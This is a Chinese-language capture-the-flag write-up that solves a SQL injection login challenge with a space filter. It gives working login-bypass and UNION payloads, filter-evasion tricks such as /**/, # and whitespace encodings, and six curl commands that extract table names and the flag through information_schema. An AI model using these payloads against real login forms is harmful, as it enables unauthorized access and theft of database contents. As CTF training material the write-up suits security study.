# SQL 注入绕过空格过滤获取 Flag

## 题目信息

- 类型：Web - SQL 注入
- 关键过滤：空格被过滤
- 登录页面，POST 提交 `name` 和 `pwd` 参数
- 服务器：Apache/2.4.7 (Ubuntu)，MySQL 5.5

## 解题思路

### 1. 信息收集

访问目标 URL，发现是一个登录页面，表单通过 POST 方式提交 `name`（用户名）和 `pwd`（密码）两个字段。

### 2. 判断注入点

对 `name` 和 `pwd` 字段分别测试单引号闭合：

```
name=admin'&pwd=admin
```

返回"用户名或密码错误"（非 SQL 报错），说明存在注入但错误被统一处理。

### 3. 确认空格过滤

尝试带空格的经典注入 `admin' or 1=1--` 失败，去掉空格后 `1'or'1'='1` 成功登录：

```
name=1'or'1'='1&pwd=1'or'1'='1
```

返回"登录成功，欢迎：admin"，确认空格被过滤。

### 4. 绕过空格进行 UNION 注入

- 用 `/**/`（MySQL 注释）替代空格
- 用 `#` 替代 `--` 作为注释符（`--` 后需要空格才能生效，空格被过滤所以换用 `#`）

先确定列数为 2：

```
name=1'union/**/select/**/1,2#&pwd=admin
```

返回"登录成功，欢迎：1"，说明第 1 列显示在页面上，2 列 UNION 注入可行。

### 5. 提取数据

| 步骤 | Payload | 结果 |
|------|---------|------|
| 查数据库 | `1'union/**/select/**/database(),2#` | `ctf` |
| 查表名 | `1'union/**/select/**/group_concat(table_name),2/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'#` | `admin,flag` |
| 查列名 | `1'union/**/select/**/group_concat(column_name),2/**/from/**/information_schema.columns/**/where/**/table_name='flag'#` | `flag` |
| 取 flag | `1'union/**/select/**/flag,2/**/from/**/flag#` | `flag{a9689c23c7a5e5bcba}` |

## 完整 Payload 汇总

```bash
# 1. 确认注入（绕过空格登录）
curl -X POST "http://target/" -d "name=1'or'1'='1&pwd=1'or'1'='1"

# 2. 测试 UNION 列数
curl -X POST "http://target/" --data-urlencode "name=1'union/**/select/**/1,2#" --data-urlencode "pwd=admin"

# 3. 查当前数据库
curl -X POST "http://target/" --data-urlencode "name=1'union/**/select/**/database(),2#" --data-urlencode "pwd=admin"

# 4. 查表名
curl -X POST "http://target/" --data-urlencode "name=1'union/**/select/**/group_concat(table_name),2/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'#" --data-urlencode "pwd=admin"

# 5. 查列名
curl -X POST "http://target/" --data-urlencode "name=1'union/**/select/**/group_concat(column_name),2/**/from/**/information_schema.columns/**/where/**/table_name='flag'#" --data-urlencode "pwd=admin"

# 6. 取 flag
curl -X POST "http://target/" --data-urlencode "name=1'union/**/select/**/flag,2/**/from/**/flag#" --data-urlencode "pwd=admin"
```

## 注意事项

1. **空格过滤的绕过方式**：本题使用 `/**/` 成功，其他备选方案还有：
   - `%09`（Tab）、`%0a`（换行）、`%0b`（垂直制表符）、`%0c`（换页符）
   - 括号 `()` 包裹子查询（如 `union(select(1),2)`）
   - `${IFS}`（Linux Shell 中替代空格，仅适用于命令注入场景）

2. **注释符选择**：`--` 后面必须跟空格才能作为 SQL 注释符，空格被过滤时 `--` 无法正常使用，应改用 `#`。

3. **`--data-urlencode`**：curl 发送 POST 数据时，使用 `--data-urlencode` 确保特殊字符（`#`、`'`、`/**/`）被正确编码，避免被 shell 或 curl 自身解析。

4. **判断列数**：UNION 注入必须保证 SELECT 的列数与原查询一致，从 1 列开始逐步递增测试，直到不报错为止。

5. **闭合方式**：本题单引号闭合（`name='输入'`），不同题目可能是双引号、无引号、括号闭合等，需要逐一尝试。
